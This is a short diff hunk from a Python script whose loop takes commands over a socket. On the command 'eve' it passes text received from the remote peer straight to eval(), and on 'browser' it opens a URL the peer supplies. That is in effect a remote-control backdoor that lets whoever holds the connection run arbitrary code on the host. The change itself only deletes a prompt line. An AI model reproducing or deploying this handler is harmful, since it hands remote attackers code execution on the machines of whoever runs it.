@@ -27,7 +27,6 @@ while True:
             if data == "eve":
                  eval(user.recv(1024).decode("utf-8").lower())
             if data == "browser":
-                 server.send("input url:")
                  webbrowser.open_new_tab(user.recv(1024).decode("utf-8").lower())
     except Exception:
                     None
